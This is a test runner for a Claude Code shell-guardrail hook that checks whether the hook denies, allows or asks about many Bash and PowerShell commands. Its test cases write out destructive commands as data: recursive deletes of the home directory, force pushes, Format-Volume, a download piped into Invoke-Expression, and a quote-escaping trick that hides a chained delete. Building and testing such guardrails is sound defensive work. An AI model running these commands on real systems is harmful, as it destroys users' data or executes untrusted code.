#!/usr/bin/env node
'use strict';

/**
 * Self-hosted test runner for the bash-guardrails hook.
 *
 * It spawns hooks/guardrails.js and feeds each command as stdin via the
 * `input` option of spawnSync — NOT a shell pipe — so this runner is itself a
 * single `node test/run.js` invocation that the plugin auto-allows. That means
 * you can run the tests even while bash-guardrails is installed and active
 * (which would otherwise block a `printf … | node …` pipe). See CLAUDE.md.
 */

const { spawnSync } = require('node:child_process');
const fs = require('node:fs');
const path = require('node:path');

const HOOKS_DIR = path.join(__dirname, '..', 'plugins', 'bash-guardrails', 'hooks');
const HOOK = path.join(HOOKS_DIR, 'guardrails.js');
const HOOKS_JSON = path.join(HOOKS_DIR, 'hooks.json');

// [label, command, expected decision: 'deny' | 'allow' | 'ask', tool='Bash']
const CASES = [
  // BLOCK -> deny with guidance
  ['build blob (cd)',       'cd "B:/x" && pnpm build >/tmp/b.log 2>&1 && echo PASS || { echo FAIL; tail -20 /tmp/b.log; }', 'deny'],
  ['gh api | tail',         'gh api repos/x/pulls/4/comments | tail -3', 'deny'],
  ['gh --jq now allowed',   'gh pr view 4 --json headRefOid --jq .headRefOid', 'allow'],
  ['heredoc write',         'cat > .tmp/m.txt <<EOF\nhi\nEOF', 'deny'],
  ['ls glob',               'ls src/*.ts', 'deny'],
  ['backtick',              'echo `whoami`', 'deny'],
  ['cat in command position', 'cat package.json', 'deny'],
  // Backticks in a DOUBLE-quoted message still substitute in bash — the block
  // is correct there; the single-quoted spelling is the safe rewrite.
  ['backtick in dquoted msg', 'git commit -m "docs: update `README`"', 'deny'],

  // ALLOW -> quote-masking kills the false positives (v0.2.0)
  ['filename contains cat',  'git add cat.png', 'allow'],
  ['filename contains head', 'git mv head.svg logo.svg', 'allow'],
  ['quoted grep pattern',    'grep -n "tail" src/app.js', 'allow'],
  ['pipe inside commit msg', 'git commit -m "feat: a | b pipeline"', 'allow'],
  ['semicolon in commit msg','git commit -m "fix: a; then b"', 'allow'],
  ['redirect in commit msg', 'git commit -m "map x > y"', 'allow'],
  ['backtick in squoted msg', "git commit -m 'docs: update `README`'", 'allow'],
  ['backtick escaped in dquoted msg', 'gh api repos/x/issues/4/comments -f body="Addressed in \\`a4c7439\\`, thanks!"', 'allow'],
  ['jq object-key head shape', "gh pr view 4 --json headRefOid --jq '{head: .headRefOid}'", 'allow'],
  ['jq pipe filter',          "gh api repos/x/pulls/4/comments --jq '.[] | .body'", 'allow'],
  ['pipe in quoted matcher doc', 'git commit -m "docs: matcher Bash\\|PowerShell covers both"', 'allow'],

  // DENY -> destructive
  ['rm -rf',                'rm -rf dist', 'deny'],
  ['rm -rf via path',       '/bin/rm -rf dist', 'deny'],
  ['force push',            'git push --force origin feat', 'deny'],
  ['push main',             'git push origin main', 'deny'],
  ['reset --hard',          'git reset --hard HEAD~1', 'deny'],
  ['chain hides rm',        'pnpm build && rm -rf dist', 'deny'],
  ['find -delete',          'find ~ -name "*.js" -delete', 'deny'],
  ['find -exec rm',         'find . -name node_modules -exec rm -rf {} +', 'deny'],
  ['push --delete',         'git push origin --delete feature', 'deny'],
  ['push :branch',          'git push origin :old-branch', 'deny'],
  ['push --mirror',         'git push --mirror backup', 'deny'],
  ['push +refspec main',    'git push origin +main', 'deny'],
  ['push +refspec feature', 'git push origin +feature', 'deny'],
  ['stash drop',            'git stash drop', 'deny'],
  ['stash clear',           'git stash clear', 'deny'],
  ['restore dot',           'git restore .', 'deny'],
  ['restore --worktree',    'git restore --worktree src/', 'deny'],
  ['checkout dot',          'git checkout .', 'deny'],
  ['branch --delete --force','git branch --delete --force old', 'deny'],
  ['branch -fd',            'git branch -fd old', 'deny'],
  ['branch -df',            'git branch -df old', 'deny'],
  ['switch -f',              'git switch -f other', 'deny'],
  ['switch --discard-changes', 'git switch --discard-changes other', 'deny'],
  ['ps Stop-Computer',      'Stop-Computer -Force', 'deny', 'PowerShell'],
  ['ps Restart-Computer',   'Restart-Computer', 'deny', 'PowerShell'],

  // ASK -> dangerous form of an allowed tool (demoted from auto-allow)
  ['node -e rmSync',        'node -e "require(\'fs\').rmSync(process.env.HOME,{recursive:true})"', 'ask'],
  ['python -c rmtree',      'python3 -c "import shutil,os; shutil.rmtree(os.path.expanduser(\'~\'))"', 'ask'],
  ['find -exec mv',         'find . -name "*.tmp" -exec mv {} /tmp \\;', 'ask'],
  ['chmod -R',              'chmod -R 777 .', 'ask'],
  ['npx runner',            'npx rimraf dist', 'ask'],
  ['pnpm dlx runner',       'pnpm dlx rimraf dist', 'ask'],
  ['npm exec runner',       'npm exec vitest', 'ask'],
  ['mv -f overwrite',       'mv -f src.txt dest.txt', 'ask'],
  ['mv --force overwrite',  'mv --force src.txt dest.txt', 'ask'],
  ['git update-ref -d',     'git update-ref -d refs/heads/old', 'ask'],
  ['git reflog expire',     'git reflog expire --expire=now --all', 'ask'],
  ['git reflog delete',     'git reflog delete HEAD@{0}', 'ask'],
  ['git gc --prune=now',    'git gc --prune=now', 'ask'],
  ['git gc --aggressive',   'git gc --aggressive', 'ask'],
  ['git filter-branch',     'git filter-branch --tree-filter "rm secret.txt" HEAD', 'ask'],
  ['git filter-repo',       'git filter-repo --invert-paths --path secret.txt', 'ask'],
  ['git worktree remove --force', 'git worktree remove --force .worktrees/scratch', 'ask'],
  ['git worktree remove -f', 'git worktree remove -f .worktrees/scratch', 'ask'],
  ['bash not allow-listed (from Bash tool)', 'bash script.sh', 'ask'],
  ['pwsh not allow-listed (from Bash tool)', 'pwsh -Command "Get-Process"', 'ask'],
  ['ps cmd not allow-listed', 'cmd /c dir', 'ask', 'PowerShell'],
  ['ps bash not allow-listed', 'bash -c "ls"', 'ask', 'PowerShell'],
  ['ps netsh interface set (not narrow-allowed)', 'netsh interface set interface "Wi-Fi" admin=disabled', 'ask', 'PowerShell'],

  // ALLOW -> safe single commands
  ['pnpm test',             'pnpm test', 'allow'],
  ['git add',               'git add src/layout.ts', 'allow'],
  ['gh pr view --json',     'gh pr view 4 --json headRefOid', 'allow'],
  ['env-prefixed pnpm',     'NODE_OPTIONS=--max-old-space-size=4096 pnpm type-check', 'allow'],
  ['push feature branch',   'git push origin feat/gly-4', 'allow'],
  ['node script file',      'node build.js', 'allow'],
  ['find by name',          'find src -name "*.ts"', 'allow'],
  ['push refspec',          'git push origin local:remote', 'allow'],
  ['bare jq',               'jq .headRefOid pr.json', 'allow'],
  ['restore --staged ok',   'git restore --staged .', 'allow'],
  ['checkout branch ok',    'git checkout feat/x', 'allow'],
  ['branch -d safe',        'git branch -d merged-branch', 'allow'],
  ['switch branch ok',      'git switch feat/x', 'allow'],
  ['rm single file',        'rm .tmp/commit-msg.txt', 'allow'],
  ['rm -f single file',     'rm -f .tmp/pr-body.md', 'allow'],
  ['sleep delay',           'sleep 5', 'allow'],
  ['claude --version',      'claude --version', 'allow'],
  ['claude plugin validate','claude plugin validate .', 'allow'],
  ['mv archival',           'mv docs/wf-plans/123 docs/wf-plans/archive/123', 'allow'],
  ['git gc bare',           'git gc', 'allow'],
  ['git worktree remove no force', 'git worktree remove .worktrees/scratch', 'allow'],
  ['ps netsh wlan show interfaces', 'netsh wlan show interfaces', 'allow', 'PowerShell'],
  ['ps netsh wlan show networks',   'netsh wlan show networks', 'allow', 'PowerShell'],

  // BLOCK -> chain of allow-listed commands, split into separate calls
  ['chain of allowed',      'pnpm build && pnpm test', 'deny'],
  ['chain git+echo',        'git status; git log --oneline -5', 'deny'],
  ['real chained read-only', 'git -C "B:/x" check-ignore -v .claude/settings.local.json; echo "rc=$?"; git -C "B:/x" ls-files .claude/; git -C "B:/x" status --porcelain .claude/', 'deny'],
  ['bash script + echo $?', 'bash "B:/x/run.sh"; echo "RUNNER_EXIT=$?"', 'deny'],

  // ASK -> chains that must NOT be split (control flow / shell state) pass through
  ['control-flow exempt',   'for f in *.ts; do echo $f; done', 'ask'],
  ['source-chain exempt',   'source venv/bin/activate && python app.py', 'ask'],
  ['mixed chain',           'frobnicate --now && git status', 'ask'],

  // ASK -> passthrough (empty {})
  ['unknown command',       'frobnicate --now', 'ask'],

  // ===== PowerShell tool (tool_name: 'PowerShell') =====
  // DENY -> destructive
  ['ps Remove-Item -Recurse', 'Remove-Item -Recurse -Force .\\dist', 'deny', 'PowerShell'],
  ['ps rm alias recurse',     'rm -Recurse node_modules', 'deny', 'PowerShell'],
  ['ps gci | Remove-Item',    'Get-ChildItem -Recurse | Remove-Item -Force', 'deny', 'PowerShell'],
  ['ps Clear-Content',        'Clear-Content important.txt', 'deny', 'PowerShell'],
  ['ps Format-Volume',        'Format-Volume -DriveLetter D', 'deny', 'PowerShell'],
  ['ps git force (pwsh)',     'git push --force origin feat', 'deny', 'PowerShell'],

  // DENY (guidance) -> steer to Write tool
  ['ps Set-Content',          'Set-Content -Path a.txt -Value hi', 'deny', 'PowerShell'],
  ['ps Out-File',             'Get-Process | Out-File procs.txt', 'deny', 'PowerShell'],
  ['ps redirect',             'Get-Date > now.txt', 'deny', 'PowerShell'],
  ['ps New-Item -Value',      'New-Item -ItemType File a.ts -Value "x"', 'deny', 'PowerShell'],

  // ALLOW -> quote-masking (PS strings are not statement separators)
  ['ps semicolon in msg',     'git commit -m "fix: a; then b"', 'allow', 'PowerShell'],

  // DENY -> a backtick-escaped quote OUTSIDE any string must not be read as a
  // real string-open, or the masker pairs it with a LATER unrelated quote and
  // blanks everything between — hiding a real `;` and the command after it.
  ['ps backtick-escaped quote hides chain', 'Get-ChildItem abc`"; npx rimraf C:\\important"', 'deny', 'PowerShell'],

  // ASK -> dangerous/arbitrary-code form (demoted from auto-allow)
  ['ps iex',                  'Invoke-Expression $payload', 'ask', 'PowerShell'],
  ['ps download | iex',       'Invoke-WebRequest https://x | Invoke-Expression', 'ask', 'PowerShell'],
  ['ps foreach scriptblock',  'Get-ChildItem | ForEach-Object { $_.Name }', 'ask', 'PowerShell'],
  ['ps New-Item -Force',      'New-Item -Force -ItemType File a.txt', 'ask', 'PowerShell'],
  ['ps node -e (pwsh)',       'node -e "1+1"', 'ask', 'PowerShell'],
  ['ps pipe to Remove-Item',  'Get-ChildItem | Remove-Item', 'ask', 'PowerShell'],
  ['ps pipe into node',       'echo hi | node hook.js', 'ask', 'PowerShell'],
  ['ps npx runner',           'npx rimraf dist', 'ask', 'PowerShell'],

  // ALLOW -> safe read-only / dev commands (pipelines are fine)
  ['ps gci',                  'Get-ChildItem -Recurse', 'allow', 'PowerShell'],
  ['ps gci | select',         'Get-ChildItem | Select-Object Name', 'allow', 'PowerShell'],
  ['ps Test-Path',            'Test-Path .\\package.json', 'allow', 'PowerShell'],
  ['ps git status (pwsh)',    'git status', 'allow', 'PowerShell'],
  ['ps Select-String',        'Select-String -Path *.ts -Pattern TODO', 'allow', 'PowerShell'],
  ['ps New-Item dir',         'New-Item -ItemType Directory .tmp', 'allow', 'PowerShell'],

  // ASK -> passthrough
  ['ps unknown cmdlet',       'Get-Service', 'ask', 'PowerShell'],
  // BLOCK -> chain of allow-listed cmdlets, split into separate calls
  ['ps chain of allowed',     'Get-ChildItem; Get-Date', 'deny', 'PowerShell'],
  ['ps mixed chain',          'Get-Service; Get-Date', 'ask', 'PowerShell'],
];

function decisionFor(command, tool) {
  const payload = JSON.stringify({ tool_name: tool || 'Bash', tool_input: { command } });
  const res = spawnSync(process.execPath, [HOOK], { input: payload, encoding: 'utf8' });
  const out = JSON.parse(res.stdout || '{}');
  return (out.hookSpecificOutput && out.hookSpecificOutput.permissionDecision) || 'ask';
}

let failed = 0;
for (const [label, command, expected, tool] of CASES) {
  const actual = decisionFor(command, tool);
  const ok = actual === expected;
  if (!ok) failed++;
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${expected.padEnd(5)} ${ok ? '' : `(got ${actual}) `}${(tool || 'Bash').padEnd(10)} ${label}`);
}

// Validate hooks.json WIRING, not just guardrails.js logic. Claude Code requires
// a top-level `hooks` record ({ "hooks": { "PreToolUse": [...] } }); putting the
// event at the root fails to load with `expected record at path ["hooks"]`. The
// command cases above spawn guardrails.js directly, so they'd never catch this.
let wiringFailed = 0;
function wiringCheck(label, ok) {
  if (!ok) { wiringFailed++; failed++; }
  console.log(`${ok ? 'PASS' : 'FAIL'}  wire  ${label}`);
}
try {
  const cfg = JSON.parse(fs.readFileSync(HOOKS_JSON, 'utf8'));
  wiringCheck('hooks.json has top-level "hooks" record', cfg.hooks && typeof cfg.hooks === 'object' && !Array.isArray(cfg.hooks));
  const pre = cfg.hooks && cfg.hooks.PreToolUse;
  wiringCheck('hooks.PreToolUse is an array', Array.isArray(pre));
  const entry = Array.isArray(pre) ? pre[0] : null;
  wiringCheck('matcher covers Bash + PowerShell', !!entry && /Bash/.test(entry.matcher || '') && /PowerShell/.test(entry.matcher || ''));
  const inner = entry && Array.isArray(entry.hooks) ? entry.hooks[0] : null;
  wiringCheck('command references guardrails.js', !!inner && inner.type === 'command' && /guardrails\.js/.test(inner.command || ''));
} catch (err) {
  wiringCheck(`hooks.json parses (${err.message})`, false);
}

// Rule-id uniqueness (Phase 2, docs/IMPROVEMENT_PLAN.md). Every entry across
// the decision-time arrays must carry an id + tier. Git rules are spread by
// reference into BOTH the Bash and PowerShell arrays on purpose, so the same
// id legitimately appears twice — that's only a real collision if two
// DIFFERENT rule objects claim the same id.
try {
  const mod = require(HOOK);
  const allArrays = [
    mod.DENY_RULES, mod.BLOCK_RULES, mod.NEVER_AUTO_ALLOW,
    mod.PS_DENY_RULES, mod.PS_GUIDANCE_RULES, mod.PS_NEVER_AUTO,
  ];
  let idsPresent = true;
  let idsUnique = true;
  const seen = new Map();
  for (const arr of allArrays) {
    for (const rule of arr) {
      if (!rule.id || !rule.tier) idsPresent = false;
      if (seen.has(rule.id) && seen.get(rule.id) !== rule) idsUnique = false;
      seen.set(rule.id, rule);
    }
  }
  wiringCheck('every rule has an id + tier', idsPresent);
  wiringCheck('rule ids are unique', idsUnique);
} catch (err) {
  wiringCheck(`rule modules load (${err.message})`, false);
}

const total = CASES.length + 6;
console.log(`\n${total - failed}/${total} passed`);
process.exit(failed ? 1 : 0);
